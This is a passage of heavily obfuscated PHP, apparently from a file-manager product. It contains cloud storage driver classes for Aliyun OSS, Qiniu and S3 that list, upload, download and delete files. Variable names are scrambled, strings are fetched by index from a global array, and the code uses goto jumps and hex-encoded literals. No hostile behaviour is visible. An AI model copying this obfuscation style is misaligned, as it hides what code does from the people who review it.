isFile($ˆ“îĞû‘) { return !$this->isFolder($ˆ“îĞû‘) && $this->objectMeta($ˆ“îĞû‘); } public function isFolder($ò•ìÁº) { return $this->cacheMethod($_SERVER[†ûãı«°][179], $ò•ìÁº); } protected function objectMeta($Ø°©ªş) { return $this->cacheMethod($_SERVER[†ûãı«°][181], $Ø°©ªş); } protected function _objectMeta($æÑÑßŠ©) { $Å‚Õ–®¨ =& $_SERVER[†ûãı«°]; try { $Ê™›‘Å¢ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($æÑÑßŠ©)); } catch (OSS\Core\OssException $ÜÍÕü) { $this->writeLog(__FUNCTION__ . $Å‚Õ–®¨[214] . $ÜÍÕü->getMessage()); $Ê™›‘Å¢ = !1; } if ($Ê™›‘Å¢) { $Ê™›‘Å¢[$Å‚Õ–®¨[79]] = intval($Ê™›‘Å¢[$Å‚Õ–®¨[1490]]); } return $Ê™›‘Å¢; } protected function _isFolder($…Ï‚ƒË) { $õ€ÊŠŠ =& $_SERVER[†ûãı«°]; if ($…Ï‚ƒË == $õ€ÊŠŠ[12] || $…Ï‚ƒË == $õ€ÊŠŠ[8]) { return !0; } $äîúïÆË = array($õ€ÊŠŠ[1485] => $õ€ÊŠŠ[8], $õ€ÊŠŠ[1486] => rtrim($…Ï‚ƒË, $õ€ÊŠŠ[8]) . $õ€ÊŠŠ[8], $õ€ÊŠŠ[1487] => 1, $õ€ÊŠŠ[1488] => $õ€ÊŠŠ[12]); $ã¤È¨ßµ = $this->client->listObjects($this->bucket, $äîúïÆË); if ($ã¤È¨ßµ->getObjectList() || $ã¤È¨ßµ->getPrefixList()) { return !0; } return !1; } public function writeLog($ÙÜóÜòô = '', $¢»Â©ô = false) { $¦•Õ· ¼ =& $_SERVER[†ûãı«°]; $ °ãñ†Å = in_array(ACTION, array($¦•Õ· ¼[212], $¦•Õ· ¼[213])); if (!$ °ãñ†Å && !GLOBAL_DEBUG) { return; } $ŸãŒüÉ = 0; if (stripos($ÙÜóÜòô, $¦•Õ· ¼[1512]) !== !1) { $ŸãŒüÉ = 1; $øõŞåÆ° = explode($¦•Õ· ¼[1513], $ÙÜóÜòô); $ÙÜóÜòô = !empty($øõŞåÆ°[1]) ? $øõŞåÆ°[1] : $ÙÜóÜòô; } else { if (stripos($ÙÜóÜòô, $¦•Õ· ¼[1514])) { $ŸãŒüÉ = 2; $øõŞåÆ° = explode($¦•Õ· ¼[1514], $ÙÜóÜòô); $øõŞåÆ° = explode($¦•Õ· ¼[4], $øõŞåÆ°[0]); $ÙÜóÜòô = !empty($øõŞåÆ°[1]) ? $øõŞåÆ°[1] : $ÙÜóÜòô; } } if ($ °ãñ†Å && I18n::getType() == $¦•Õ· ¼[1515]) { if ($ŸãŒüÉ == 1) { $ÙÜóÜòô = str_replace($¦•Õ· ¼[1516], $¦•Õ· ¼[1517], $ÙÜóÜòô); } else { if ($ŸãŒüÉ == 2) { $øõŞåÆ° = explode($¦•Õ· ¼[214], $øõŞåÆ°[0]); $¡Ê¸Òéù = isset($øõŞåÆ°[1]) ? $øõŞåÆ°[1] : $¦•Õ· ¼[12]; $‚ ¬‹¸Ï = array($¦•Õ· ¼[1518] => $¦•Õ· ¼[1519], $¦•Õ· ¼[1520] => $¦•Õ· ¼[1521], $¦•Õ· ¼[1522] => $¦•Õ· ¼[1523], $¦•Õ· ¼[1524] => $¦•Õ· ¼[1525], $¦•Õ· ¼[1526] => $¦•Õ· ¼[1527], $¦•Õ· ¼[1528] => $¦•Õ· ¼[1529], $¦•Õ· ¼[1530] => $¦•Õ· ¼[1531], $¦•Õ· ¼[1532] => $¦•Õ· ¼[1533], $¦•Õ· ¼[1534] => $¦•Õ· ¼[1535], $¦•Õ· ¼[1536] => $¦•Õ· ¼[1537]); if (isset($‚ ¬‹¸Ï[$¡Ê¸Òéù])) { $ÙÜóÜòô = $‚ ¬‹¸Ï[$¡Ê¸Òéù]; } } } if (stripos($ÙÜóÜòô, $¦•Õ· ¼[1538])) { $ÙÜóÜòô = $¦•Õ· ¼[1539]; } } if (!trim($ÙÜóÜòô)) { return; } parent::writeLog(trim($ÙÜóÜòô), $¢»Â©ô); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ÑİæÕá³) { parent::__construct(); require_once SDK_DIR . $_SERVER[†ûãı«°][1540]; $this->_init($ÑİæÕá³); } public function _init($¶ÁåÅ—Ú) { $ª¬«¬„ =& $_SERVER[†ûãı«°]; $this->config = $¶ÁåÅ—Ú; foreach ($¶ÁåÅ—Ú as $†È¸­šñ => $ó—è§ ) { if (isset($this->{$†È¸­šñ})) { $this->{$†È¸­šñ} = $ó—è§ ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ª¬«¬„[1541] . LNG($ª¬«¬„[1476])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¦õıÙÂ…, $Ø÷úÊ¼² = '', $ŠÄ°Òœ = REPEAT_RENAME) { if ($this->setContent($¦õıÙÂ…, $Ø÷úÊ¼²)) { return $this->getPathOuter($¦õıÙÂ…); } return !1; } public function mkdir($ÄÁ´²Æ­, $ÕêøÕ—ı = REPEAT_SKIP) { $†—¹Ôµƒ =& $_SERVER[†ûãı«°]; $ÀùÍâ¡ˆ = trim($ÄÁ´²Æ­, $†—¹Ôµƒ[8]); if ($this->_isFolder($ÀùÍâ¡ˆ)) { return $this->getPathOuter($ÀùÍâ¡ˆ); } $ÄÁ´²Æ­ = $ÀùÍâ¡ˆ . $†—¹Ôµƒ[8]; $ÉÒšµ¤« = get_path_this($ÀùÍâ¡ˆ); $ÙèÆƒ‰¬ = $ÄÁ´²Æ­ . $ÉÒšµ¤«; if (!$this->mkfile($ÙèÆƒ‰¬)) { return !1; } if (!$this->moveFile($ÙèÆƒ‰¬, $ÄÁ´²Æ­)) { $this->delFile($ÙèÆƒ‰¬); return !1; } return $this->getPathOuter($ÀùÍâ¡ˆ); } public function copyFile($âµÊ¯ŸŞ, $öŞéÔÊ„) { $ÄÒÔÀº = $this->bucketManager->copy($this->bucket, $âµÊ¯ŸŞ, $this->bucket, $öŞéÔÊ„, !0); return $ÄÒÔÀº ? !1 : $this->getPathOuter($öŞéÔÊ„); } public function moveFile($üíĞ¼¦‹, $ÙÍ¥¼±›) { $Çıô†ÛÁ = $this->bucketManager->move($this->bucket, $üíĞ¼¦‹, $this->bucket, $ÙÍ¥¼±›, !0); return $Çıô†ÛÁ ? !1 : $this->getPathOuter($ÙÍ¥¼±›); } public function delFile($­²Ø¿Á˜) { if (!$this->exist($­²Ø¿Á˜)) { return !0; } $èèÕ×±æ = $this->bucketManager->delete($this->bucket, $­²Ø¿Á˜); if (!$èèÕ×±æ) { return !0; } return $èèÕ×±æ->code() == 612 ? !0 : !1; } public function delFolder($ıŸüÊÛÇ) { $ä…¶ñØ÷ =& $_SERVER[†ûãı«°]; if (!$this->exist($ıŸüÊÛÇ)) { return !0; } $this->listItemCache = !1; $ŒàñÚ´ = $this->fileList($ıŸüÊÛÇ); $this->listItemCache = !0; $Ş ¿ÍÌª = trim($ıŸüÊÛÇ, $ä…¶ñØ÷[8]) . $ä…¶ñØ÷[8]; if (!empty($ıŸüÊÛÇ) && $ıŸüÊÛÇ !== $ä…¶ñØ÷[230] && !in_array($Ş ¿ÍÌª, $ŒàñÚ´[$ä…¶ñØ÷[85]])) { $ŒàñÚ´[$ä…¶ñØ÷[85]][] = $Ş ¿ÍÌª; } $œö‡•ƒ = $this->delByBatch($ŒàñÚ´[$ä…¶ñØ÷[86]]); if (!$œö‡•ƒ) { return !1; } $œö‡•ƒ = $this->delByBatch($ŒàñÚ´[$ä…¶ñØ÷[85]]); if (!$œö‡•ƒ) { return !1; } return $this->delFile($Ş ¿ÍÌª); } private function delByBatch($±ÍŠ»ç¦) { foreach (array_chunk($±ÍŠ»ç¦, 1000) as $å½®’ª¨) { $úİÁÕÑÛ = $this->bucketManager->buildBatchDelete($this->bucket, $å½®’ª¨); list($ä’ªóÄ¢, $°ÀáĞâØ) = $this->bucketManager->batch($úİÁÕÑÛ); if ($°ÀáĞâØ) { return !1; } } return !0; } public function rename($«õ½¬†, $…©ÁÄêğ) { return $this->renameObject($«õ½¬†, $…©ÁÄêğ); } public function fileInfo($ÅĞßğß×, $€•àõÙñ = false, $·€µ¡Ú = array()) { $ÔòÂ¯û» =& $_SERVER[†ûãı«°]; $åé£Í€í = array($ÔòÂ¯û»[32] => $this->pathThis($ÅĞßğß×), $ÔòÂ¯û»[87] => $this->getPathOuter($ÔòÂ¯û»[8] . $ÅĞßğß×), $ÔòÂ¯û»[33] => $ÔòÂ¯û»[232], $ÔòÂ¯û»[79] => isset($·€µ¡Ú[$ÔòÂ¯û»[1542]]) ? $·€µ¡Ú[$ÔòÂ¯û»[1542]] : 0, $ÔòÂ¯û»[169] => $this->ext($ÅĞßğß×)); if ($€•àõÙñ) { return $åé£Í€í; } $åé£Í€í[$ÔòÂ¯û»[233]] = $åé£Í€í[$ÔòÂ¯û»[88]] = 0; $åé£Í€í[$ÔòÂ¯û»[234]] = $åé£Í€í[$ÔòÂ¯û»[235]] = !0; if (empty($·€µ¡Ú)) { $·€µ¡Ú = $this->objectMeta($ÅĞßğß×); if (!$·€µ¡Ú) { return $åé£Í€í; } } if (isset($·€µ¡Ú[$ÔòÂ¯û»[236]]) && $·€µ¡Ú[$ÔòÂ¯û»[236]]) { $åé£Í€í[$ÔòÂ¯û»[237]] = $·€µ¡Ú[$ÔòÂ¯û»[236]]; } if (isset($·€µ¡Ú[$ÔòÂ¯û»[247]]) && $·€µ¡Ú[$ÔòÂ¯û»[247]]) { $åé£Í€í[$ÔòÂ¯û»[237]] = $·€µ¡Ú[$ÔòÂ¯û»[247]]; } if (isset($·€µ¡Ú[$ÔòÂ¯û»[1543]])) { $åé£Í€í[$ÔòÂ¯û»[88]] = substr($·€µ¡Ú[$ÔòÂ¯û»[1543]] . $ÔòÂ¯û»[12], 0, 10); } if (isset($·€µ¡Ú[$ÔòÂ¯û»[1542]])) { $åé£Í€í[$ÔòÂ¯û»[79]] = $·€µ¡Ú[$ÔòÂ¯û»[1542]]; } return $åé£Í€í; } public function folderInfo($ò÷æ†“±, $¢åÑè = false) { $ª½ûŠéï =& $_SERVER[†ûãı«°]; $ÆÒ×Ò¥¶ = array($ª½ûŠéï[32] => $this->pathThis($ò÷æ†“±), $ª½ûŠéï[87] => $this->getPathOuter($ª½ûŠéï[8] . $ò÷æ†“±), $ª½ûŠéï[33] => $ª½ûŠéï[78]); if ($¢åÑè) { return $ÆÒ×Ò¥¶; } $ÆÒ×Ò¥¶[$ª½ûŠéï[233]] = $ÆÒ×Ò¥¶[$ª½ûŠéï[88]] = 0; $ÆÒ×Ò¥¶[$ª½ûŠéï[234]] = $ÆÒ×Ò¥¶[$ª½ûŠéï[235]] = !0; $ò÷æ†“± = rtrim($ò÷æ†“±, $ª½ûŠéï[8]) . $ª½ûŠéï[8]; $¥Ñ¯ÈÒ” = $this->objectMeta($ò÷æ†“±); if (isset($¥Ñ¯ÈÒ”[$ª½ûŠéï[1543]])) { $ÆÒ×Ò¥¶[$ª½ûŠéï[88]] = substr($¥Ñ¯ÈÒ”[$ª½ûŠéï[1543]] . $ª½ûŠéï[12], 0, 10); } return $ÆÒ×Ò¥¶; } public function listPath($å¥šç†ş, $ªÒó‹¢ß = false) { $”úŸÇœí =& $_SERVER[†ûãı«°]; $îÙ×—á… = $this->fileList($å¥šç†ş, $”úŸÇœí[8], !0); foreach ($îÙ×—á…[$”úŸÇœí[85]] as $¿¥©¯äæ => $“Èà·†¥) { $îÙ×—á…[$”úŸÇœí[85]][$¿¥©¯äæ] = $this->folderInfo($“Èà·†¥, $ªÒó‹¢ß); } foreach ($îÙ×—á…[$”úŸÇœí[86]] as $¿¥©¯äæ => $“Èà·†¥) { $îÙ×—á…[$”úŸÇœí[86]][$¿¥©¯äæ] = $this->fileInfo($“Èà·†¥[$”úŸÇœí[97]], $ªÒó‹¢ß, $“Èà·†¥); } return $îÙ×—á…; } public function has($ÇÌ—û¡, $à‰ê¬é© = false, $şˆ÷Áœ© = true) { $Å­ Ò­… =& $_SERVER[†ûãı«°]; $ÇÌ—û¡ = trim($ÇÌ—û¡, $Å­ Ò­…[8]); $×÷¾ç‘½ = empty($ÇÌ—û¡) && $ÇÌ—û¡ !== $Å­ Ò­…[230] ? $Å­ Ò­…[12] : $ÇÌ—û¡ . $Å­ Ò­…[8]; $áˆ±¬Úì = $Å­ Ò­…[12]; $ø £ûïé = 500; $ÌÈ¹Ëú = $Å­ Ò­…[8]; $´ÌÂœ´Š = $òÃ–™Ëµ = 0; while (!0) { check_abort(); list($éÔ¹¥±, $®á±áõ) = $this->bucketManager->listFiles($this->bucket, $×÷¾ç‘½, $áˆ±¬Úì, $ø £ûïé, $ÌÈ¹Ëú); if ($®á±áõ) { break; } $áˆ±¬Úì = array_key_exists($Å­ Ò­…[1488], $éÔ¹¥±) ? $áˆ±¬Úì = $éÔ¹¥±[$Å­ Ò­…[1544]] : $Å­ Ò­…[12]; if ($à‰ê¬é©) { if (!empty($éÔ¹¥±[$Å­ Ò­…[1545]])) { $´ÌÂœ´Š += count($éÔ¹¥±[$Å­ Ò­…[1545]]); } if (!empty($éÔ¹¥±[$Å­ Ò­…[1546]])) { $òÃ–™Ëµ += count($éÔ¹¥±[$Å­ Ò­…[1546]]); } if ($áˆ±¬Úì === $Å­ Ò­…[12]) { break; } continue; } if ($şˆ÷Áœ©) { if (!empty($éÔ¹¥±[$Å­ Ò­…[1545]])) { return !0; } } else { if (!empty($éÔ¹¥±[$Å­ Ò­…[1546]])) { return !0; } } if ($áˆ±¬Úì === $Å­ Ò­…[12]) { break; } } if ($à‰ê¬é©) { return array($Å­ Ò­…[241] => $´ÌÂœ´Š, $Å­ Ò­…[242] => $òÃ–™Ëµ); } return !1; } public function listAll($üÜœÇ÷ƒ) { $¯˜ÆüË  =& $_SERVER[†ûãı«°]; $…¦‚™…° = $this->fileList($üÜœÇ÷ƒ, $¯˜ÆüË [12], !0); $£Âø»Æ = array_to_keyvalue($…¦‚™…°[$¯˜ÆüË [86]], $¯˜ÆüË [32]); foreach ($…¦‚™…°[$¯˜ÆüË [85]] as $´Æûã®) { if (is_string($´Æûã®)) { $£Âø»Æ[$´Æûã®] = array($¯˜ÆüË [79] => 0); } } return $this->listAllFiles($üÜœÇ÷ƒ, $£Âø»Æ); } private function fileList($î«ªñƒû, $¸»Ÿ¬–ô = '', $é¨¨·Üß = 0) { $ıÖÕ£˜º =& $_SERVER[†ûãı«°]; $î«ªñƒû = trim($î«ªñƒû, $ıÖÕ£˜º[8]); $²œ÷…Û = empty($î«ªñƒû) && $î«ªñƒû !== $ıÖÕ£˜º[230] ? $ıÖÕ£˜º[12] : $î«ªñƒû . $ıÖÕ£˜º[8]; $—Ø¬á€Ï = $ıÖÕ£˜º[12]; $éÆ«şÛö = 1000; $ƒ€ÇÉ  = $ŠÁ¯¦Ã½ = array(); while (!0) { check_abort(); list($À°ˆü÷Á, $—¿°ø) = $this->bucketManager->listFiles($this->bucket, $²œ÷…Û, $—Ø¬á€Ï, $éÆ«şÛö, $¸»Ÿ¬–ô); if ($—¿°ø) { break; } $—Ø¬á€Ï = array_key_exists($ıÖÕ£˜º[1488], $À°ˆü÷Á) ? $—Ø¬á€Ï = $À°ˆü÷Á[$ıÖÕ£˜º[1544]] : $ıÖÕ£˜º[12]; $ÌÕô¦ƒĞ = isset($À°ˆü÷Á[$ıÖÕ£˜º[1545]]) ? $À°ˆü÷Á[$ıÖÕ£˜º[1545]] : array(); $‰úå¢Íë = isset($À°ˆü÷Á[$ıÖÕ£˜º[1546]]) ? $À°ˆü÷Á[$ıÖÕ£˜º[1546]] : array(); foreach ($ÌÕô¦ƒĞ as $¦¬¤òÈø) { if ($¦¬¤òÈø[$ıÖÕ£˜º[97]] == $²œ÷…Û) { continue; } $Ÿéş¯¦ù = $¦¬¤òÈø[$ıÖÕ£˜º[97]]; $İ¸¾Ãã¦ = $¦¬¤òÈø[$ıÖÕ£˜º[1542]]; $¦¬¤òÈø[$ıÖÕ£˜º[79]] = $İ¸¾Ãã¦; $ƒãÍ– = $İ¸¾Ãã¦ == 0 && substr($Ÿéş¯¦ù, strlen($Ÿéş¯¦ù) - 1, 1) == $ıÖÕ£˜º[8] ? !0 : !1; $this->cacheMethodInfoSet($Ÿéş¯¦ù, $ƒãÍ–, $¦¬¤òÈø); if ($ƒãÍ–) { $ƒ€ÇÉ [] = $Ÿéş¯¦ù; continue; } $ŠÁ¯¦Ã½[] = $é¨¨·Üß ? $¦¬¤òÈø : $Ÿéş¯¦ù; } foreach ($‰úå¢Íë as $Ÿéş¯¦ù) { if ($Ÿéş¯¦ù == $²œ÷…Û) { continue; } $ƒ€ÇÉ [] = $Ÿéş¯¦ù; $this->cacheMethodInfoSet($Ÿéş¯¦ù, !0); } if ($—Ø¬á€Ï === $ıÖÕ£˜º[12]) { break; } } $this->cacheMethodInfoSet($î«ªñƒû, !0); return array($ıÖÕ£˜º[85] => $ƒ€ÇÉ , $ıÖÕ£˜º[86] => $ŠÁ¯¦Ã½); } public function canRead($µúß¥—–) { return $this->exist($µúß¥—–) ? !0 : !1; } public function canWrite($¹¯ØÂÇ¤) { return $this->exist($¹¯ØÂÇ¤) ? !0 : !1; } public function getContent($É¾ƒåà„) { return $this->fileSubstr($É¾ƒåà„, 0, -1); } public function setContent($¶î•Àƒî, $ÕâûÕè = '') { $£ì™¡Â = $this->tempFile($this->pathThis($¶î•Àƒî)); file_put_contents($£ì™¡Â, $ÕâûÕè); if ($this->upload($¶î•Àƒî, $£ì™¡Â)) { $this->tempFileRemve($£ì™¡Â); return !0; } return !1; } public function refreshUrls($ ÂÓ©) { $½¬¡ÖËª =& $_SERVER[†ûãı«°]; $ø•Íó÷å = array(); if (is_array($ ÂÓ©)) { foreach ($ ÂÓ© as $á‹½Œ…™) { $ø•Íó÷å[] = $this->link($á‹½Œ…™); } } else { $ø•Íó÷å[] = $this->link($ ÂÓ©); } $ŒÀ¶÷ßå = new Qiniu\Cdn\CdnManager($this->auth); list($¶€¦ƒ¬½, $‰æ‹’«Ë) = $ŒÀ¶÷ßå->refreshUrls($ø•Íó÷å); if ($‰æ‹’«Ë) { return !1; } return $¶€¦ƒ¬½[$½¬¡ÖËª[1275]] == $½¬¡ÖËª[835] ? !0 : !1; } public function fileSubstr($•Äâ¹”æ, $Ñ¨»Ñ¥â, $İæâ„Ô¼) { $Øèª†©¡ =& $_SERVER[†ûãı«°]; if (!($İùĞòï¹ = $this->link($•Äâ¹”æ))) { return !1; } $ÀÕ†•Ú» = !1; if ($İæâ„Ô¼ > 0) { $á«±ÃçÕ = $Ñ¨»Ñ¥â + $İæâ„Ô¼ - 1; $ÀÕ†•Ú» = array($Øèª†©¡[1547] . $Ñ¨»Ñ¥â . $Øèª†©¡[464] . $á«±ÃçÕ); } $èñ¥½ğï = url_request($İùĞòï¹, $Øèª†©¡[1507], !1, $ÀÕ†•Ú»); return $èñ¥½ğï[$Øèª†©¡[826]] ? $èñ¥½ğï[$Øèª†©¡[1298]] : !1; } public function upload($Õ¤µ´ë†, $¯ØÑÖ¾ê, $¨®š–¿İ = false, $¼–¬ïğ‘ = REPEAT_REPLACE) { $îïº„ = new Qiniu\Storage\UploadManager(); $‰šèı½ó = $this->auth->uploadToken($this->bucket, $Õ¤µ´ë†); $Â…¸”çë = get_file_mime(get_path_ext($¯ØÑÖ¾ê)); list($ï­ÑÏÂ±, $ìòù·‹) = $îïº„->putFile($‰šèı½ó, $Õ¤µ´ë†, $¯ØÑÖ¾ê, null, $Â…¸”çë); return $ìòù·‹ ? !1 : $this->getPathOuter($Õ¤µ´ë†); } public function uploadFormData($ÑñÒÏ³‘, $èöá”¢Ú = 3600) { return $this->uploadToken($ÑñÒÏ³‘, $èöá”¢Ú); } public function uploadMultiData($úÌà¯ÛÙ, $ÕĞ—äí = 3600) { return $this->uploadToken($úÌà¯ÛÙ, $ÕĞ—äí); } private function uploadToken($•çî­ø, $¢ •û¸É = 3600) { $É“°ÏÓ =& $_SERVER[†ûãı«°]; $ç¿§Í¬â = $¢ •û¸É; $Ø˜è®ƒ• = array($É“°ÏÓ[1548] => $É“°ÏÓ[1549]); $ï¦Ó—×” = $•çî­ø; $Ã¦ÃÅûû = $this->auth->uploadToken($this->bucket, $ï¦Ó—×”, $ç¿§Í¬â, $Ø˜è®ƒ•, !0); $¼õ†Â¶ = empty($this->region) || $this->region == $É“°ÏÓ[1550] ? $É“°ÏÓ[12] : $É“°ÏÓ[464] . $this->region; $’…‡À‰ = http_type() . "\72\x2f\x2f\x75\x70\x6c\x6f\x61\144{$¼õ†Â¶}\56\x71\151\156\x69\x75\x70\x2e\x63\x6f\155\x2f"; return array($É“°ÏÓ[1551] => $Ã¦ÃÅûû, $É“°ÏÓ[1552] => $’…‡À‰); } public function download($õ«¬ãûí, $Ü·¨¦¨ê) { $ì÷±¯šÀ = IO::getPathInner(IO::mkfile($Ü·¨¦¨ê)); if (!($†§É°Ñç = $this->link($õ«¬ãûí))) { return !1; } $êÁŒ¨ = 0; $á’ëŠÙ = 1024 * 200; $›°§ÉòŠ = fopen($ì÷±¯šÀ, $_SERVER[†ûãı«°][1553]); while (!0) { $Ş¬¥ÒÉ¥ = $this->fileSubstr($õ«¬ãûí, $êÁŒ¨, $á’ëŠÙ); if ($Ş¬¥ÒÉ¥ === !1) { return !1; } fwrite($›°§ÉòŠ, $Ş¬¥ÒÉ¥); $êÁŒ¨ += $á’ëŠÙ; if (strlen($Ş¬¥ÒÉ¥) < $á’ëŠÙ) { break; } } fclose($›°§ÉòŠ); return $Ü·¨¦¨ê; } public function link($óäÁŒºŠ, $Ëœ¸Ø… = '') { if (!$this->isFile($óäÁŒºŠ)) { return !1; } $­ä÷Á¸ = $this->getHost() . $_SERVER[†ûãı«°][8] . $this->pathEncode($óäÁŒºŠ) . $Ëœ¸Ø…; return $this->auth->privateDownloadUrl($­ä÷Á¸, 3600 * 12); } public function fileOut($”Ÿ²•ä», $‡Å¬•¹µ = false, $­ÖÇ¿ = false, $ÈÔòíÊ = '') { $ñŞâíÒµ =& $_SERVER[†ûãı«°]; if ($this->isFileOutServer()) { return $this->fileOutServer($”Ÿ²•ä», $‡Å¬•¹µ, $­ÖÇ¿, $ÈÔòíÊ); } if (!$­ÖÇ¿) { $­ÖÇ¿ = $this->pathThis($”Ÿ²•ä»); } $ŒŒª²¤ = $‡Å¬•¹µ ? $ñŞâíÒµ[1554] . rawurlencode($­ÖÇ¿) : $ñŞâíÒµ[12]; $Ô¥‰Í’À = $this->link($”Ÿ²•ä», $ŒŒª²¤); $this->fileOutLink($Ô¥‰Í’À); } public function fileOutServer($´’ô¶çÄ, $³ÔÖ”½ = false, $­á³Ş´ = false, $æÏ®ë´ñ = '') { parent::fileOut($´’ô¶çÄ, $³ÔÖ”½, $­á³Ş´, $æÏ®ë´ñ); } public function fileOutImage($îÀæˆ•ª, $ÊÁíÉû° = 250) { if ($this->size($îÀæˆ•ª) > 1024 * 1024 * 20) { return $this->fileOutImageServer($îÀæˆ•ª, $ÊÁíÉû°); } $êóãÇµ = $this->link($îÀæˆ•ª, $_SERVER[†ûãı«°][1555] . $ÊÁíÉû°); $this->fileOutLink($êóãÇµ); } public function fileOutImageServer($ÛõÅĞì, $µç³Ìñ† = 250) { parent::fileOutImage($ÛõÅĞì, $µç³Ìñ†); } public function hashMd5($©ŒèÅ) { $’Ô®¾Ş¾ =& $_SERVER[†ûãı«°]; $ˆÈ²Íõ = $this->objectMeta($©ŒèÅ); return isset($ˆÈ²Íõ[$’Ô®¾Ş¾[247]]) ? $ˆÈ²Íõ[$’Ô®¾Ş¾[247]] : !1; $© Ç†âğ = $this->link($©ŒèÅ, $’Ô®¾Ş¾[1556]); } public function size($€¶óâîó) { $­ø¬×æ³ = $this->objectMeta($€¶óâîó); return $­ø¬×æ³ ? $­ø¬×æ³[$_SERVER[†ûãı«°][79]] : 0; } public function info($­ıË¸ÚÜ) { if ($this->isFolder($­ıË¸ÚÜ)) { return $this->folderInfo($­ıË¸ÚÜ); } else { if ($this->isFile($­ıË¸ÚÜ)) { return $this->fileInfo($­ıË¸ÚÜ); } } return !1; } public function exist($²üŞÅ±) { return $this->isFile($²üŞÅ±) || $this->isFolder($²üŞÅ±); } public function isFile($Öô÷˜’‰) { return !$this->isFolder($Öô÷˜’‰) && $this->objectMeta($Öô÷˜’‰); } public function isFolder($Ë³ç¥üì) { return $this->cacheMethod($_SERVER[†ûãı«°][179], $Ë³ç¥üì); } protected function objectMeta($Ä¼ß×˜×) { return $this->cacheMethod($_SERVER[†ûãı«°][181], $Ä¼ß×˜×); } protected function _objectMeta($¡ÜŒ‚úÙ) { $¤áı¦ò =& $_SERVER[†ûãı«°]; list($ôïó˜­½, $¶Ä©›™á) = $this->bucketManager->stat($this->bucket, $¡ÜŒ‚úÙ); if ($ôïó˜­½) { $ôïó˜­½[$¤áı¦ò[79]] = intval($ôïó˜­½[$¤áı¦ò[1542]]); } return $ôïó˜­½; } protected function _isFolder($Ë™Ï²‘ ) { $õœÜÑÓ» =& $_SERVER[†ûãı«°]; if ($Ë™Ï²‘  == $õœÜÑÓ»[12] || $Ë™Ï²‘  == $õœÜÑÓ»[8]) { return !0; } list($Å°’â¸‘, $µ×ãÃšà) = $this->bucketManager->listFiles($this->bucket, trim($Ë™Ï²‘ , $õœÜÑÓ»[8]) . $õœÜÑÓ»[8], $õœÜÑÓ»[12], 1, $õœÜÑÓ»[8]); return !empty($Å°’â¸‘[$õœÜÑÓ»[1545]]) || !empty($Å°’â¸‘[$õœÜÑÓ»[1546]]) ? !0 : !1; } } goto eøˆƒÄÃŸ•; fŸªó¨œÆ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($óÒî¡ñ) { $Åş›ÜŒŒ =& $_SERVER[†ûãı«°]; parent::__construct($óÒî¡ñ); $ÙÅ”Ù² = isset($óÒî¡ñ[$Åş›ÜŒŒ[258]]) && $óÒî¡ñ[$Åş›ÜŒŒ[258]] == $Åş›ÜŒŒ[249] ? $Åş›ÜŒŒ[249] : $Åş›ÜŒŒ[315]; $this->setSignVersion($ÙÅ”Ù²); } public function link($µú÷¿€®, $Ÿ öÓß = array()) { return parent::link($µú÷¿€®, $Ÿ öÓß); } public function fileOut($êÈ§¨ì, $»Ö›ºĞ¹ = false, $ş‚·È´¶ = false, $ªÇ¥ÅÏó = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[†ûãı«°][316])) { return parent::fileOutServer($êÈ§¨ì, $»Ö›ºĞ¹, $ş‚·È´¶, $ªÇ¥ÅÏó); } parent::fileOut($êÈ§¨ì, $»Ö›ºĞ¹, $ş‚·È´¶, $ªÇ¥ÅÏó); } public function fileOutImage($¼íãõ–ì, $İãëùµ× = 250) { if (strstr($this->endpoint, $_SERVER[†ûãı«°][316])) { return parent::fileOutImageServer($¼íãõ–ì, $İãëùµ×); } parent::fileOutImage($¼íãõ–ì, $İãëùµ×); } public function fileOutLink($¿ã­ÎĞ) { $ê·¼Óû‰ =& $_SERVER[†ûãı«°]; if (substr($¿ã­ÎĞ, 0, 7) == $ê·¼Óû‰[218]) { $¿ã­ÎĞ = $ê·¼Óû‰[219] . substr($¿ã­ÎĞ, 7); } header($ê·¼Óû‰[175] . $¿ã­ÎĞ); die; } } define($_SERVER[†ûãı«°][317], 1); define($_SERVER[†ûãı«°][318], 2); goto Fˆ¨Š¦‘†; fË˜æÀ«ÍÕ: class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\x72\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\162\x52\145\143\171\x63\154\x65\x7d"; const KOD_USER_FAV = "\173\x75\163\x65\x72\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\x72\x46\151\154\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\x72\106\x69\x6c\x65\x54\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\165\160\x52\x6f\x6f\164\x53\145\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\123\x68\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\x72\x53\x68\141\162\x65\114\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\162\x65\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\162\x65\x49\164\145\155\x7d"; const KOD_SHARE_LINK = "\173\163\x68\x61\162\145\111\x74\145\x6d\x4c\151\156\x6b\175"; const KOD_SEARCH = "\173\163\x65\x61\x72\x63\150\x7d"; const KOD_BLOCK = "\173\x62\x6c\x6f\x63\x6b\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\165\163\145\162\122\x65\156\143\x65\156\164\175"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\x65\x72\175"; public static function typeList() { $½¡°Ş”ú =& $_SERVER[†ûãı«°]; return array($½¡°Ş”ú[1347] => self::KOD_SOURCE, $½¡°Ş”ú[1348] => 